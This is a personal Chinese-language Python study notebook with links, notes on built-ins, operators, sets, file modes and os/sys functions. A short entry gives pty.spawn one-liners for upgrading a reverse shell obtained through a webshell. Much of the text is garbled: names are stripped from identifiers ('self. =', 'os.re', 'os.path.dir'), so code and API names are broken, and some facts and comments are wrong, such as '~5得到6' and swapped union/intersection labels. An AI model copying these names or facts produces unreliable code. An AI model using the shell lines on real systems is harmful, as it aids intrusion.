#我的博客园	从零开始的程序员生活
http://www.cnblogs.com/lgjbky/

性能{
不需要实现复杂的内存共享且需利用多cpu,用多进程
实现复杂的内存共享及IO密集型应用：多线程或协程
实现复杂的内存共享及CPU密集型应用：协程

http://www.cnblogs.com/huyuedong/p/5882510.html  很不错的博客
多核cpu执行多任务的原理：由于实际应用中,任务的数量往往远超过cpu的核数,所以操作系统实际上是把这些多任务轮流地调度到每个核心上执行。
对于操作系统来说,一个应用就是一个进程。比如打开一个浏览器,它是一个进程；打开一个记事本,它是一个进程。每个进程有它特定的进程号。他们共享系统的内存资源。进程是操作系统分配资源的最小单位。
而对于每一个进程而言,比如一个视频播放器,它必须同时播放视频和音频,就至少需要同时运行两个"子任务",进程内的这些子任务就是通过线程来完成。线程是最小的执行单元。一个进程它可以包含多个线程,这些线程相互独立,同时又共享进程所拥有的资源。
}
一些资源和github库{
#很6的博客
http://www.cnblogs.com/hongten/tag/python/default.html?page=2
#面向对象
http://www.cnblogs.com/wupeiqi/p/4493506.html
http://www.cnblogs.com/wupeiqi/p/4766801.html
http://www.cnblogs.com/huyuedong/p/5851082.html
#socket编程
http://www.cnblogs.com/lst1010/p/5911956.html  #简单客户连接
Python3基础学习笔记(精品)  百度文库 挺不错
#廖雪峰的官网python教程也是很不错的,很全面。
http://www.cnblogs.com/youhui/articles/3772001.html #Python Imaging Library 中文手册
http://www.cnblogs.com/skydesign/archive/2011/09/02/2163592.html
一个有趣的python排序模块: bisect 插入一个数,再排序

pygame学习资源{
比较不错的系列教材
http://www.cnblogs.com/msxh/category/751578.html
http://www.cnblogs.com/A-FM/p/6823288.html
http://www.cnblogs.com/xiaowuyi/category/426566.html
}
pdir 是很不错的代替内置dir的库

获取帮助的几个方法:help()\查看API文档\dir()

}
小知识点{
c:\python33添加到你的PATH 环境变量中,你可以在DOS 窗口中
输入以下命令:set path=%path%;C:\python33

functools itertools 很厉害的内置库

id() 方法的返回值就是对象的内存地址。

在#! 行(首行)后插入至少一行特殊的注释行来定义源文件的编码。
# -*- coding: encoding -*-
#!/usr/bin/env python3

#python自带的简单的 http 服务器：
python -m SimpleHTTPServer

#反弹shell
#通过webshell反弹shell回来之后获取真正的ttyshell,后面还有关于反弹shell的样例
python -c 'import pty; pty.spawn("/bin/sh")'
python3.4 -c 'import pty; pty.spawn("/bin/bash")'

cProfile {
python -m cProfile dome1.py	#统计dome1.py中个函数的执行时间
python -m cProfile -o dome1.out dome1.py	#结果写入到dome1.out中
}

python中最出名的性能分析库：cProfile、line_profiler

语句执行跟踪{
有时更好的办法是看执行了哪些语句。你可以使用一些IDE的调试器的单步执行,但你需要明确知道你在找那些语句,否则整个过程会进行地非常缓慢。
标准库里面的trace模块,可以打印运行时包含在其中的模块里所有执行到的语句。(就像制作一份项目报告)
python -mtrace --trace pytest.py
这会产生大量输出（执行到的每一行都会被打印出来,你可能想要用grep（windows下用findstr）过滤那些你感兴趣的模块）。
Linux：
python -mtrace –trace pytest.py | egrep '^(mod1.py|mod2.py)'
Windows：
python -mtrace --trace pytest.py | findstr pytest.py
}
}

运算符{
Python 算术操作符 + - * /(除法完整除数) //(除法取整数) **(幂运算) %(取余数)

运算符	名称	说明	例子
+	加	两个对象相加	3 + 5得到8。'a' + 'b'得到'ab'。
-	减	得到负数或是一个数减去另一个数	-5.2得到一个负数。50 - 24得到26。
*	乘	两个数相乘或是返回一个被重复若干次的字符串	2 * 3得到6。'la' * 3得到'lalala'。
**	幂	返回x的y次幂3 ** 4得到81（即3 * 3 * 3 * 3）
/	除	x除以y	4/3得到1（整数的除法得到整数结果）。4.0/3或4/3.0得到1.3333333333333333
//	取整除	返回商的整数部分	4 // 3.0得到1.0
%	取模	返回除法的余数	8%3得到2。-25.5%2.25得到1.5
'<<'	左移	把一个数的比特向左移一定数目（每个数在内存中都表示为比特或二进制数字，即0和1）	2 << 2得到8。——2按比特表示为10
>>	右移	把一个数的比特向右移一定数目	11 >> 1得到5。——11按比特表示为1011，向右移动1比特后得到101，即十进制的5。
&	按位与	数的按位与	5 & 3得到1。
|	按位或	数的按位或	5 | 3得到7。
^	按位异或	数的按位异或	5 ^ 3得到6
~	按位翻转	x的按位翻转是-(x+1)	~5得到6。
<	小于	返回x是否小于y。所有比较运算符返回1表示真，返回0表示假。这分别与特殊的变量True和False等价。注意，这些变量名的大写。	5 < 3返回0（即False）而3 < 5返回1（即True）。比较可以被任意连接：3 < 5 < 7返回True。
>	大于	返回x是否大于y	5 > 3返回True。如果两个操作数都是数字，它们首先被转换为一个共同的类型。否则，它总是返回False。
<=	小于等于	返回x是否小于等于y	x = 3; y = 6; x <= y返回True。
>=	大于等于	返回x是否大于等于y	x = 4; y = 3; x >= y返回True。
==	等于	比较对象是否相等	x = 2; y = 2; x == y返回True。x = 'str'; y = 'stR'; x == y返回False。x = 'str'; y = 'str'; x == y返回True。
!=	不等于	比较两个对象是否不相等	x = 2; y = 3; x != y返回True。
not	布尔“非”	如果x为True，返回False。如果x为False，它返回True。	x = True; not y返回False。
# 短路计算
and	布尔“与”	如果x为False，x and y返回False，否则它返回y的计算值。
x = False; y = True; x and y，由于x是False，返回False。在这里，Python不会计算y，因为它知道这个表达式的值肯定是False（因为x是False）。这个现象称为短路计算。
or	布尔“或”	如果x是True，它返回True，否则它返回y的计算值。
x = True; y = False; x or y返回True。短路计算在这里也适用
>>> x=1
>>> y=2
>>> print(x and y)
2
>>> print(x or y)
1
x=[]
>>> print(x and y)
[]
>>> print(x or y) 
2


}
set集合{
>>> x = set("jihite")
>>> y = set(['d', 'i', 'm', 'i', 't', 'e'])
>>> x       #把字符串转化为set，去重了
set(['i', 'h', 'j', 'e', 't'])
>>> y
set(['i', 'e', 'm', 'd', 't'])
>>> x & y   #交
set(['i', 'e', 't'])
>>> x | y   #并
set(['e', 'd', 'i', 'h', 'j', 'm', 't'])
>>> x - y   #差
set(['h', 'j'])
>>> y - x
set(['m', 'd'])
>>> x ^ y   #对称差：x和y的交集减去并集
set(['d', 'h', 'j', 'm'])

>>> x
set(['i', 'h', 'j', 'e', 't'])
>>> s = set("hi")
>>> s
set(['i', 'h'])
>>> len(x)                    #长度
>>> 'i' in x
True
>>> s.issubset(x)             #s是否为x的子集
True
>>> y
set(['i', 'e', 'm', 'd', 't'])
>>> x.union(y)                #交
set(['e', 'd', 'i', 'h', 'j', 'm', 't'])
>>> x.intersection(y)         #并
set(['i', 'e', 't'])
>>> x.difference(y)           #差
set(['h', 'j'])
>>> x.symmetric_difference(y) #对称差
set(['d', 'h', 'j', 'm'])
>>> s.update(x)               #更新s，加上x中的元素
>>> s
set(['e', 't', 'i', 'h', 'j'])
>>> s.add(1)                  #增加元素
>>> s
set([1, 'e', 't', 'i', 'h', 'j'])
>>> s.remove(1)               #删除已有元素，如果没有会返回异常
>>> s
set(['e', 't', 'i', 'h', 'j'])
>>> s.remove(2)

Traceback (most recent call last):
  File "<pyshell#29>", line 1, in <module>
    s.remove(2)
KeyError: 2
>>> s.discard(2)               #如果存在元素，就删除；没有不报异常
>>> s
set(['e', 't', 'i', 'h', 'j'])
>>> s.clear()                  #清除set
>>> s
set([])
>>> x
set(['i', 'h', 'j', 'e', 't'])
>>> x.pop()                    #随机删除一元素
'i'
>>> x
set(['h', 'j', 'e', 't'])
>>> x.pop()
'h'

}

如何查看关键字{
#http://www.cnblogs.com/zhuzhu2016/p/6170150.html 参考此博客
>>> import keyword
>>> keyword.kwlist
['False', 'None', 'True', 'and', 'as', 'assert', 'break', 'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal', 'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield']
}
如何查看内置函数{
help(sequence) #sequence在python不是一种特定的类型,而是泛指一系列的类型。
>>> import builtins
>>> dir (builtins)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'Error', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '____', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']

工厂函数{
#工厂函数就是指这些内建函数都是类对象,当你调用它们时,实际上是创建了一个类实例。
int(),long(),float(),complex(),bool()
str(),unicode(),basestring()
list(),tuple()：生成列表或者元组
type()：查看类型
dict()：生成一个字典
set():   生产可变集合
frozenset()：生成不可变集合
object()
classmethod()：声明一个类方法
staticmethod()：声明一个静态方法
super()：     指此类的父类
property()
file()
}

Python3常用内置函数{

数学相关{
cmp(obja,objb) : 比较两个对象的大小,返回值根据a,b的值的大小关系为正数,负数或者0
abs(a) : 求取绝对值。abs(-1)
max(list) : 求取list最大值。max([1,2,3]),max(1,2,3,4),max((1,2,3,4)),max({1,2,3,4})
min(list) : 求取list最小值。min([1,2,3]),同上
sum(list) : 求取list元素的和。 sum([1,2,3]) >>> 6  ,sum((1,2,3,4)),sum({1,2,3,4})
sorted(list) : 排序,返回排序后的list。sorted({1,6,3,4}),sorted((1,6,3,4)),sorted([1,6,3,4])
len(list) : list长度,len([1,2,3])
divmod(a,b): 获取商和余数。 divmod(5,2) >>> (2,1)
pow(a,b) : 获取乘方数。pow(2,3) >>> 8
round(a,b) : 获取指定位数的小数。a代表浮点数,b代表要保留的位数。round(3.1415926,2) >>> 3.14
range(a[,b]) : 生成一个a到b的数组,左闭右开。 range(1,10) >>> [1,2,3,4,5,6,7,8,9]
}
类型转换{
int(str) : 转换为int型。int('1') >>> 1
float(int/str) : 将int型或字符型转换为浮点型。float('1') >>> 1.0
str(int) : 转换为字符型。str(1) >>> '1'
bool(int) : 转换为布尔类型。 bool(0) >>> False bool(None) >>> False
bytes(str,code) : 接收一个字符串,与所要编码的格式,返回一个字节流类型。bytes('abc', 'utf-8') >>> b'abc' bytes(u'爬虫', 'utf-8') >>> b'\xe7\x88\xac\xe8\x99\xab'
list(iterable) : 转换为list。 list((1,2,3)) >>> [1,2,3]
iter(iterable)： 返回一个可迭代的对象。 iter([1,2,3]) >>> <list_iterator object at 0x0000000003813B00>
dict(iterable) : 转换为dict。 dict([('a', 1), ('b', 2), ('c', 3)]) >>> {'a':1, 'b':2, 'c':3} >>> dict(zip([23,345,65,42,234],[1,2,34,345,675,45]))  >>> dict(enumerate([1,34,43,54,64,43]))
enumerate(iterable) : 返回一个枚举对象。
tuple(iterable) : 转换为tuple。 tuple([1,2,3]) >>>(1,2,3)
set(iterable) : 转换为set。 set([1,4,2,4,3,5]) >>> {1,2,3,4,5} set({1:'a',2:'b',3:'c'}) >>> {1,2,3}
hex(int) : 转换为16进制。hex(1024) >>> '0x400'
oct(int) : 转换为8进制。 oct(1024) >>> '0o2000'
bin(int) : 转换为2进制。 bin(1024) >>> '0b10000000000'
chr(int) : 转换数字为相应ASCI码字符。 chr(65) >>> 'A'
ord(str) : 转换ASCI字符为相应的数字。 ord('A') >>> 65
}
例子{
int("5") # 转换为整数 integer
float(2) # 转换为浮点数 float
long("23") # 转换为长整数 long integer
str(2.3) # 转换为字符串 string
complex(3, 9) # 返回复数 3 + 9i
ord("A") # "A"字符对应的数值
chr(65) # 数值65对应的字符
unichr(65) # 数值65对应的unicode字符
bool(0) # 转换为相应的真假值,在Python中,0相当于False
bin(56) # 返回一个字符串,表示56的二进制数     相反操作>>> int('0b111000', base=2)
hex(56) # 返回一个字符串,表示56的十六进制数
oct(56) # 返回一个字符串,表示56的八进制数
list((1,2,3)) # 转换为表 list
tuple([2,3,4]) # 转换为定值表 tuple
slice(5,2,-1) # 构建下标对象 slice
dict(a=1,b="hello",c=[1,2,3]) # 构建词典 dictionary**粗体文本**
}
取下标{
>>> seasons = ['Spring', 'Summer', 'Fall', 'Winter']
>>> list(enumerate(seasons))
    [(0, 'Spring'), (1, 'Summer'), (2, 'Fall'), (3, 'Winter')]
>>> list(enumerate(seasons, start=1))
    [(1, 'Spring'), (2, 'Summer'), (3, 'Fall'), (4, 'Winter')]
}
open 函数{
fp = open("test.txt",w)     直接打开一个文件,如果文件不存在则创建文件
关于open 模式：
w     以写方式打开,
a     以追加模式打开 (从 EOF 开始, 必要时创建新文件)
r+     以读写模式打开
w+     以读写模式打开 (参见 w )
a+     以读写模式打开 (参见 a )
rb     以二进制读模式打开
wb     以二进制写模式打开 (参见 w )
ab     以二进制追加模式打开 (参见 a )
rb+    以二进制读写模式打开 (参见 r+ )
wb+    以二进制读写模式打开 (参见 w+ )
ab+    以二进制读写模式打开 (参见 a+ )

fp.read([size])                     #size为读取的长度,以byte为单位
fp.readline([size])                 #读一行,如果定义了size,有可能返回的只是一行的一部分
fp.readlines([size])                #把文件每一行作为一个list的一个成员,并返回这个list。其实它的内部是通过循环调用readline()来实现的。如果提供size参数,size是表示读取内容的总长,也就是说可能只读到文件的一部分。
fp.write(str)                      #把str写到文件中,write()并不会在str后加上一个换行符
fp.writelines(seq)            #把seq的内容全部写到文件中(多行一次性写入)。这个函数也只是忠实地写入,不会在每行后面加上任何东西。
fp.close()                        #关闭文件。python会在一个文件不用后自动关闭文件,不过这一功能没有保证,最好还是养成自己关闭的习惯。  如果一个文件在关闭后还对其进行操作会产生ValueError
fp.flush()                                      #把缓冲区的内容写入硬盘
fp.fileno()                                      #返回一个长整型的"文件标签"
fp.isatty()                                      #文件是否是一个终端设备文件(unix系统中的)
fp.tell()                                         #返回文件操作标记的当前位置,以文件的开头为原点
fp.next()                                       #返回下一行,并将文件操作标记位移到下一行。把一个file用于for … in file这样的语句时,就是调用next()函数来实现遍历的。
fp.truncate([size])                       #把文件裁成规定的大小,默认的是裁到当前文件操作标记的位置。如果size比文件的大小还要大,依据系统的不同可能是不改变文件,也可能是用0把文件补到相应的大小,也可能是以一些随机的内容加上去。

fp.seek(offset[,whence])              #将文件打操作标记移到offset的位置。这个offset一般是相对于文件的开头来计算的,一般为正数。whence 可选,默认0,相对于文件开始的位置。 ,1表示以当前位置为原点计算。2表示以文件末尾为原点进行计算。需要注意,如果文件以a或a+的模式打开,每次进行写操作时,文件操作标记会自动返回到文件末尾。
seek()的三种模式：
（1）f.seek(p,0)  移动到文件第p个字节处,绝对位置(相对于文件开始的位置)
（2）f.seek(p,1)  移动到相对于当前位置之后的p个字节
（3）f.seek(p,2)  移动到相对文章尾之后的p个字节
#妙用---快速创建大文件
    bigFile= open('./bigfile.txt', 'w')#必须用'w'
    bigFile.seek(1024*1024*1024* fileSize) #大小自己定,需要几个G, fileSize就是几,速度绝对快
    bigFile.write('\x00') #必须写入一次数据
    bigFile.close()
#扩展一下！
#创建一个100M的空文件
dd if=/dev/zero of=hello.txt bs=100M count=1
/dev/null，外号叫无底洞，你可以向它输出任何数据，它通吃，并且不会撑着！
/dev/zero,是一个输入设备，你可你用它来初始化文件。

du -h bigfile.txt #显示异常,并不会真的显示G,使用dd创建hello.txt是能正确显示的 ----不知道为什么
}

相关操作{
repr(obj)或者'obj' : 返回一个对象的字符串表示, 适合用于eval()求值,类似于str(obj) # >>> repr(os) >>> "<module 'os' from 'C:\\\\Python36-32\\\\lib\\\\os.py'>"
str(obj) : 返回对象适合可读性好的字符串表示,适合用户print输出  #>>> str(os) >>> "<module 'os' from 'C:\\\\Python36-32\\\\lib\\\\os.py'>"
input("Please input:") : 等待输入
filter(func, iterable) : 通过判断函数fun,筛选符合条件的元素。 filter(function or None, iterable) --> filter object   filter(lambda x: x>3, [1,2,3,4,5,6]) >>> #很有用的函数
map(func, *iterable) : 将func用于每个iterable对象。 map(lambda a,b: a+b, [1,2,3,4], [5,6,7]) >>> [6,8,10]
zip(*iterable) : 将iterable分组合并。返回一个zip对象。 list(zip([1,2,3],[4,5,6])) >>> [(1, 4), (2, 5), (3, 6)]
type()：返回一个对象的类型。
id()： 返回一个对象的唯一标识值。
hash(object)：返回一个对象的hash值,具有相同值的object具有相同的hash值。 hash('python') >>> 7070808359261009780
help()：调用系统内置的帮助系统。
isinstance()：判断一个对象是否为该类的一个实例。# if isinstance(num,(int,long,float,complex)): num是属于int,long,float,complex(复数)中的一种
issubclass()：判断一个类是否为另一个类的子类。
globals() : 返回当前全局变量的字典。
locals() : 更新并返回包含当前作用域的局部变量的字典。
next(iterator[, default]) : 接收一个迭代器,返回迭代器中的数值,如果设置了default,则当迭代器中的元素遍历后,输出default内容。
reversed(sequence) ： 生成一个反转序列的迭代器并返回。 reversed('abc') >>> ['c','b','a']  ,list(reversed([1,2,3,4,5])),list(reversed((1,2,3,4,5)))
#序列操作
all([True, 1, "hello!"]) # 是否所有的元素都相当于True值
any(["", 0, False, [], None]) # 是否有任意一个元素相当于True值
sorted([1,5,3]) # 返回正序的序列,也就是[1,3,5]
reversed([1,5,3]) # 返回反序的序列,也就是[3,5,1]
}
类,对象,属性{

class BlackMedium:
    def __init__(self, , addr):
        self. = 
        self.addr = addr

    def sell_house(self):
        print('%s 黑中介卖房子啦,傻逼才买呢,但是谁能证明自己不傻逼' % self.)

    def rent_house(self):
        print('%s 黑中介租房子啦,傻逼才租呢' % self.)

b1 = BlackMedium('万成置地', '回龙观天露园')

# 检测是否含有某属性
print(hasattr(b1, ''))
print(hasattr(b1, 'sell_house'))

# 获取属性
n = getattr(b1, '')
print(n)
func = getattr(b1, 'rent_house')
func()

# getattr(b1,'aaaaaaaa') #报错
print(getattr(b1, 'aaaaaaaa', '不存在啊'))

# 设置属性
setattr(b1, 'sb', True)
setattr(b1, 'show_', lambda self: self. + 'sb')
print(b1.__dict__)
print(b1.show_(b1))

# 删除属性
delattr(b1, 'addr')
delattr(b1, 'show_')
delattr(b1, 'show_111')  # 不存在,则报错
print(b1.__dict__)

# define class
class Me(object):
	def test(self):
		print ("Hello!")
	def new_test():
		print ("New Hello!")

me = Me()

hasattr(me, "test") # 检查me对象是否有test属性
getattr(me, "test") # 返回test属性
setattr(me, "test", new_test) # 将test属性设置为new_test
delattr(me, "test") # 删除test属性
isinstance(me, Me) # me对象是否为Me类生成的对象 (一个instance)
issubclass(Me, object) # Me类是否为object类的子类
}
编译,执行{
repr(me) # 返回对象的字符串表达
compile("print('Hello')",'test.py','exec') # 编译字符串成为code对象
eval("1 + 1") # 解释字符串表达式。参数也可以是compile()返回的code对象
exec("print('Hello')") # 解释并执行字符串,print('Hello')。参数也可以是compile()返回的code对象
}

reduce(...)
    reduce(function, sequence[, initial]) -> value
For example, reduce(lambda x, y: x+y, [1, 2, 3, 4, 5]) calculates((((1+2)+3)+4)+5). 
}
}
获取当前脚本路径{

sys.modules['模块名'] #查看模块的文件位置
sys.prefix 	#查看python的安装位置

sys.path 会返回python脚本的  当前路径  和加载的库文件路径
['C:\\Users\\\\Desktop\\10月金秋', 'C:\\Python34\\Lib\\idlelib', 'C:\\Python34\\lib\\site-packages\\pip-8.1.2-py3.4.egg', 'C:\\Python34\\lib\\site-packages\\xlwt-1.1.2-py3.4.egg', 'C:\\Python34\\lib\\site-packages\\xlutils-2.0.0-py3.4.egg', 'C:\\Python34\\lib\\site-packages\\pymysql-0.7.6-py3.4.egg', 'C:\\Windows\\system32\\python34.zip', 'C:\\Python34\\DLLs', 'C:\\Python34\\lib', 'C:\\Python34', 'C:\\Python34\\lib\\site-packages']
>>> sys.argv[0] #返回当前脚本的路径+名字
'C:\\Users\\\\Desktop\\10月金秋\\Get_case.py'
>>> sys.argv #返回当前脚本的路径+名字
['C:\\Users\\\\Desktop\\10月金秋\\Get_case.py']
#打包exe的脚本中有需要获取当前路径的情况下:
path=os.path.dir(sys.executable) #在打包成exe后正常使用
path=sys.path[0] #这样的方式会导致执行路径有问题

#当然也可以写脚本判断文件类型
import sys,os
def cur_file_dir():
     #获取脚本路径
     path = sys.path[0]
     #判断为脚本文件还是py2exe编译后的文件,如果是脚本文件,则返回的是脚本的目录,如果是py2exe编译后的文件,则返回的是编译后的文件路径
     if os.path.isdir(path):
         return path
     elif os.path.isfile(path):
         return os.path.dir(path)
#打印结果
print (cur_file_dir())

}
#os 模块负责程序与操作系统的交互,提供了访问操作系统底层的接口
os.path{
得到当前工作目录,即当前Python脚本工作的目录路径: os.getcwd()
返回指定目录下的所有文件和目录名:os.listdir()
函数用来删除一个文件:os.remove()
删除多个目录：os.removedirs(r'c:\python')
检验给出的路径是否是一个文件：os.path.isfile()
检验给出的路径是否是一个目录：os.path.isdir()
判断是否是绝对路径：os.path.isabs()
检验给出的路径是否真地存:os.path.exists()
返回一个路径的目录名和文件名:os.path.split()     eg os.path.split('/home/swaroop/byte/code/poem.txt') 结果：('/home/swaroop/byte/code', 'poem.txt')
分离扩展名：os.path.splitext()
获取路径名：os.path.dir()
获取文件名：os.path.base()
运行shell命令: os.system()
读取和设置环境变量:os.getenv() 与os.putenv()
给出当前平台使用的行终止符:os.linesep    Windows使用'\r\n',Linux使用'\n'而Mac使用'\r'
指示你正在使用的平台：os.       对于Windows,它是'nt',而对于Linux/Unix用户,它是'posix'
重命名：os.re(old, new)
创建多级目录：os.makedirs(r"c：\python\test")
创建单个目录：os.mkdir("test")
获取文件属性：os.stat(file)
修改文件权限与时间戳：os.chmod(file)
终止当前进程：os.exit()
获取文件大小：os.path.getsize(file)

目录操作：
os.mkdir("file")                   创建目录
复制文件：
shutil.copyfile("oldfile","newfile")       oldfile和newfile都只能是文件
shutil.copy("oldfile","newfile")            oldfile只能是文件夹,newfile可以是文件,也可以是目标目录
复制文件夹：
shutil.copytree("olddir","newdir")        olddir和newdir都只能是目录,且newdir必须不存在
重命名文件(目录)
os.re("old","new")       文件或目录都是使用这条命令
移动文件(目录)
shutil.move("oldpos","newpos")
删除文件
os.remove("file")
删除目录
os.rmdir("dir")只能删除空目录
shutil.rmtree("dir")    空目录、有内容的目录都可以删
转换目录
os.chdir("path")   换路径
}
os方法合集{
os.access(path, mode)           # 检验权限模式
os.chdir(path)                  # 改变当前工作目录
os.chflags(path, flags)         # 设置路径的标记为数字标记。
os.chmod(path, mode)            # 更改权限
os.chown(path, uid, gid)        # 更改文件所有者
os.chroot(path)                 # 改变当前进程的根目录
os.close(fd)                    # 关闭文件描述符 fd
os.closerange(fd_low, fd_high)  # 关闭所有文件描述符,从 fd_low (包含) 到 fd_high (不包含), 错误会忽略
os.curdir                       # 返回当前目录：('.')
os.dup(fd)                      # 复制文件描述符 fd
os.dup2(fd, fd2)                # 将一个文件描述符 fd 复制到另一个 fd2
os.environ                      # 获取系统环境变量
os.fchdir(fd)                   # 通过文件描述符改变当前工作目录
os.fchmod(fd, mode)             # 改变一个文件的访问权限,该文件由参数fd指定,参数mode是Unix下的文件访问权限。
os.fchown(fd, uid, gid)         # 修改一个文件的所有权,这个函数修改一个文件的用户ID和用户组ID,该文件由文件描述符fd指定。
os.fdatasync(fd)                # 强制将文件写入磁盘,该文件由文件描述符fd指定,但是不强制更新文件的状态信息。
os.fdopen(fd[, mode[, bufsize]])  # 通过文件描述符 fd 创建一个文件对象,并返回这个文件对象
os.fpathconf(fd, )          # 返回一个打开的文件的系统配置信息。为检索的系统配置的值,它也许是一个定义系统值的字符串,这些名字在很多标准中指定(POSIX.1, Unix 95, Unix 98, 和其它)。
os.fstat(fd)                    # 返回文件描述符fd的状态,像stat()。
os.fstatvfs(fd)                 # 返回包含文件描述符fd的文件的文件系统的信息,像 statvfs()
os.fsync(fd)                    # 强制将文件描述符为fd的文件写入硬盘。
os.ftruncate(fd, length)        # 裁剪文件描述符fd对应的文件, 所以它最大不能超过文件大小。
os.getcwd()                     # 返回当前工作目录
os.getcwdu()                    # 返回一个当前工作目录的Unicode对象
os.isatty(fd)                   # 如果文件描述符fd是打开的,同时与tty(-like)设备相连,则返回true, 否则False。
os.lchflags(path, flags)        # 设置路径的标记为数字标记,类似 chflags(),但是没有软链接
os.lchmod(path, mode)           # 修改连接文件权限
os.lchown(path, uid, gid)       # 更改文件所有者,类似 chown,但是不追踪链接。
os.link(src, dst)               # 创建硬链接,名为参数 dst,指向参数 src
os.listdir(path)                # 返回path指定的文件夹包含的文件或文件夹的名字的列表。
os.lseek(fd, pos, how)          # 设置文件描述符 fd当前位置为pos, how方式修改: SEEK_SET 或者 0 设置从文件开始的计算的pos; SEEK_CUR或者 1 则从当前位置计算; os.SEEK_END或者2则从文件尾部开始. 在unix,Windows中有效
os.lstat(path)                  # 像stat(),但是没有软链接
os.linesep                      # 当前平台使用的行终止符,win下为"\t\n",Linux下为"\n"
os.major(device)                # 从原始的设备号中提取设备major号码 (使用stat中的st_dev或者st_rdev field)。
os.makedev(major, minor)        # 以major和minor设备号组成一个原始设备号
os.makedirs(path[, mode])       # 递归文件夹创建函数。像mkdir(), 但创建的所有intermediate-level文件夹需要包含子文件夹。
os.minor(device)                # 从原始的设备号中提取设备minor号码 (使用stat中的st_dev或者st_rdev field )。
os.mkdir(path[, mode])          # 以数字mode的mode创建一个名为path的文件夹.默认的 mode 是 0777 (八进制)。
os.mkfifo(path[, mode])         # 创建命名管道,mode 为数字,默认为 0666 (八进制)
os.mknod(file[, mode=0600, device])  # 创建一个名为file文件系统节点(文件,设备特别文件或者命名pipe)。
os.open(file, flags[, mode])    # 打开一个文件,并且设置需要的打开选项,mode参数是可选的
os.openpty()                    # 打开一个新的伪终端对。返回 pty 和 tty 的文件描述符。
os.pathconf(path, )         # 返回相关文件的系统配置信息。
os.pathsep                      # 用于分割文件路径的字符串
os.pardir                       # 获取当前目录的父目录字符串名：('..')
os.pipe()                       # 创建一个管道. 返回一对文件描述符(r, w) 分别为读和写
os.popen(command[, mode[, bufsize]])  # 从一个 command 打开一个管道
os.path.abspath(path)           # 返回path规范化的绝对路径
os.path.split(path)             # 将path分割成目录和文件名二元组返回
os.path.dir(path)           # 返回path的目录。其实就是os.path.split(path)的第一个元素
os.path.base(path)          # 返回path最后的文件名。如何path以／或\结尾,那么就会返回空值。即os.path.split(path)的第二个元素
os.path.exists(path)            # 如果path存在,返回True；如果path不存在,返回False
os.path.isabs(path)             # 如果path是绝对路径,返回True
os.path.isfile(path)            # 如果path是一个存在的文件,返回True。否则返回False
os.path.isdir(path)             # 如果path是一个存在的目录,则返回True。否则返回False
os.path.join(path1[, path2[,    ]])  # 将多个路径组合后返回,第一个绝对路径之前的参数将被忽略
os.path.getatime(path)          # 返回path所指向的文件或者目录的最后存取时间
os.path.getmtime(path)          # 返回path所指向的文件或者目录的最后修改时间
os.                         # 字符串指示当前使用平台。win->'nt'; Linux->'posix'
os.read(fd, n)                  # 从文件描述符 fd 中读取最多 n 个字节,返回包含读取字节的字符串,文件描述符 fd对应文件已达到结尾, 返回一个空字符串。
os.readlink(path)               # 返回软链接所指向的文件
os.remove(path)                 # 删除路径为path的文件。如果path 是一个文件夹,将抛出OSError; 查看下面的rmdir()删除一个 directory。
os.removedirs(path)             # 递归删除目录。若目录为空,则删除,并递归到上一级目录,如若也为空,则删除,依此类推
os.re(src, dst)             # 重命名文件或目录,从 src 到 dst
os.res(old, new)            # 递归地对目录进行更名,也可以对文件进行更名。
os.rmdir(path)                  # 删除path指定的空目录,如果目录非空,则抛出一个OSError异常。
os.sep                          # 操作系统特定的路径分隔符,win下为"\\",Linux下为"/"
os.stat(path)                   # 获取path指定的路径的信息,功能等同于C API中的stat()系统调用。
os.stat_float_times([newvalue]) # 决定stat_result是否以float对象显示时间戳
os.statvfs(path)                # 获取指定路径的文件系统统计信息
os.symlink(src, dst)            # 创建一个软链接
os.system("bash command")       # 运行shell命令,直接显示
os.tcgetpgrp(fd)                # 返回与终端fd(一个由os.open()返回的打开的文件描述符)关联的进程组
os.tcsetpgrp(fd, pg)            # 设置与终端fd(一个由os.open()返回的打开的文件描述符)关联的进程组为pg。
os.tempnam([dir[, prefix]])     # 返回唯一的路径名用于创建临时文件。
os.tmpfile()                    # 返回一个打开的模式为(w+b)的文件对象 .这文件对象没有文件夹入口,没有文件描述符,将会自动删除。
os.tmpnam()                     # 为创建一个临时文件返回一个唯一的路径
